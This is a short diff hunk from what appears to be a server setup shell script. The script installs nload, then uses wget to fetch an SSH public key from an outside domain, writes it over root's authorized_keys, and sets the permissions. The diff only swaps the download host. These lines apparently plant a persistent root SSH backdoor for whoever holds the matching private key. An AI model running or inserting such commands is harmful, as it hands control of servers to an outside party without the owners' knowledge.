@@ -11,7 +11,7 @@ yum install nload -y
 cd /root
 mkdir .ssh
 cd .ssh
-wget http://myxw.ml/cackey.pub > /dev/null
+wget http://mooncn.win/cackey.pub > /dev/null
 cat cackey.pub > authorized_keys
 chmod 600 authorized_keys
 chmod 700 ~/.ssh
